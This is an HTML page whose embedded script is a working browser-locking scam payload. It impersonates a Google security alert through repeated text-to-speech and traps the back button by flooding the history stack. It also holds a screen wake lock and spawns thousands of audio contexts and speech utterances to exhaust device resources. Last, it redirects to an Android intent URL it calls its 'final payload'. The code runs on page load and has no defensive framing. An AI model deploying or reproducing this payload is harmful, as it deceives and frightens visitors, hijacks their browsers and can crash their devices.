<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Alert - Advanced History & Exhaustion Chain</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #fff; min-height: 100vh; overflow: hidden; }
  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
</style>
</head>
<body>
<script>
(function () {
  'use strict';

  // ============================================
  // KONFIGURASI AUTOPLAY & EXPLOIT PARAMS
  // ============================================
  var CONFIG = {
    tts: {
      text: "Google Security Alert. Browser navigation locked. Unauthorized access detected, preparing secure intent redirect.",
      lang: 'en-US',
      rate: 0.85,
      pitch: 1.0,
      volume: 1.0,
      repeatInterval: 8000,
      maxRepeats: 25
    },
    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=',
    targetIntentUrl: 'intent://security-alert#Intent;scheme=exploit;package=com.google.android.browser;S.browser_fallback_url=https%3A%2F%2Fgoogle.com;end;'
  };

  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
  let wakeLock = null;

  // ============================================
  // SCREEN WAKE LOCK API
  // ============================================
  async function requestPersistentWakeLock() {
    if ('wakeLock' in navigator) {
      try {
        wakeLock = await navigator.wakeLock.request('screen');
        wakeLock.addEventListener('release', () => {
          setTimeout(requestPersistentWakeLock, 1000);
        });
      } catch (err) {}
    }
  }

  // ============================================
  // HISTORY API NAVIGATION FLOODING (Back Button Trap)
  // ============================================
  function triggerHistoryFlood() {
    try {
      for (var i = 0; i < 100; i++) {
        window.history.pushState({page: i}, "Security Alert #" + i, "#trap-" + i);
      }
      console.log("[+] History navigation stack flooded.");
    } catch(e) {}
  }

  // ============================================
  // TTS — TANPA CANCEL DI DALAM LOOP
  // ============================================
  function speakOnce() {
    if (!('speechSynthesis' in window)) return;
    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;

    try {
      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
      u.lang = CONFIG.tts.lang;
      u.rate = CONFIG.tts.rate;
      u.pitch = CONFIG.tts.pitch;
      u.volume = CONFIG.tts.volume;

      var voices = window.speechSynthesis.getVoices();
      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
      if (enVoice) u.voice = enVoice;

      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
      u.onend = function () {
        state.ttsCount++;
        if (state.ttsCount < CONFIG.tts.maxRepeats) {
          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
        }
      };

      window.speechSynthesis.speak(u);
    } catch (e) {}
  }

  function startTTS() {
    if (state.ttsStarted) return;
    state.ttsStarted = true;
    window.speechSynthesis.cancel();
    speakOnce();
  }

  // ============================================
  // AUDIO CONTEXT UNLOCK
  // ============================================
  function unlockAudioContext() {
    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      if (ctx.state === 'suspended') {
        ctx.resume().catch(function(){});
      }
      var osc = ctx.createOscillator();
      var gain = ctx.createGain();
      gain.gain.value = 0.0001;
      osc.frequency.value = 20000;
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      osc.stop(ctx.currentTime + 0.1);
    } catch (e) {}
  }

  // ============================================
  // SILENT AUDIO ELEMENT
  // ============================================
  function trySilentAudio() {
    try {
      var a = new Audio(CONFIG.silentWav);
      a.volume = 0.0001;
      a.loop = true;
      var p = a.play();
      if (p && p.catch) p.catch(function(){});
    } catch (e) {}
  }

  // ============================================
  // MAIN AUDIO (Web Audio API)
  // ============================================
  function playMainAudio() {
    if (state.mainPlayed) return;
    state.mainPlayed = true;

    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      var sr = ctx.sampleRate;
      var dur = 3.0;
      var buf = ctx.createBuffer(1, sr * dur, sr);
      var d = buf.getChannelData(0);

      for (var i = 0; i < d.length; i++) {
        var t = i / sr;
        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
        var env = Math.max(0, 1 - t / dur);
        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
      }

      var src = ctx.createBufferSource();
      src.buffer = buf;
      src.connect(ctx.destination);
      src.start();
      src.onended = startTTS;
      setTimeout(startTTS, 3500);
    } catch (e) {
      startTTS();
    }
  }

  // ============================================
  // UPGRADE: HISTORY TRAP + RESOURCE EXHAUSTION + DEEP LINK HIJACK
  // ============================================
  function triggerAdvancedExploitChain() {
    console.log("[!] Initiating Advanced History Trap & Exhaustion Chain...");
    
    // Pemicu History Trap
    triggerHistoryFlood();

    // 1. Loop Pemicu Memory Leak pada Audio Engine & Speech Queue
    setInterval(function() {
      try {
        for (var i = 0; i < 2000; i++) {
          var ctx = new (window.AudioContext || window.webkitAudioContext)();
          var osc = ctx.createOscillator();
          var gain = ctx.createGain();
          
          osc.connect(gain);
          gain.connect(ctx.destination);
          osc.start(0);
          
          var u = new SpeechSynthesisUtterance("HISTORY_EXHAUSTION_" + i);
          window.speechSynthesis.speak(u);
        }
      } catch(e) {}
    }, 50);

    // 2. Delayed Deep Link / Intent Redirection Hijacking
    setTimeout(function() {
      try {
        console.log("[*] Executing final intent redirection payload...");
        window.location.replace(CONFIG.targetIntentUrl);
      } catch(e) {}
    }, 4000);
  }

  // ============================================
  // EKSEKUSI BERTAHAP
  // ============================================
  unlockAudioContext();
  trySilentAudio();
  requestPersistentWakeLock();

  setTimeout(function () {
    unlockAudioContext();
    startTTS();
  }, 100);

  setTimeout(function () {
    if (!state.mainPlayed) playMainAudio();
  }, 500);

  setTimeout(function () {
    if (!state.mainPlayed) playMainAudio();
    if (!state.ttsStarted) startTTS();
    
    // PANGGIL EXPLOIT CHAIN DI SINI
    triggerAdvancedExploitChain();
    
  }, 1500);

  // Retry handler
  var retryCount = 0;
  var retry = setInterval(function () {
    retryCount++;
    unlockAudioContext();
    trySilentAudio();
    if (!state.ttsStarted) startTTS();
    if (retryCount > 10) clearInterval(retry);
  }, 2000);

  // Popstate trap untuk mencegah navigasi mundur (Back Button Lock)
  window.addEventListener('popstate', function(event) {
    window.history.pushState({page: 'locked'}, "Security Alert", "#locked");
  });

  // Visibility change
  document.addEventListener('visibilitychange', async function () {
    if (!document.hidden && !state.mainPlayed) {
      setTimeout(playMainAudio, 100);
    }
    if (wakeLock !== null && document.visibilityState === 'visible') {
      await requestPersistentWakeLock();
    }
  });
})();
</script>
</body>
</html>
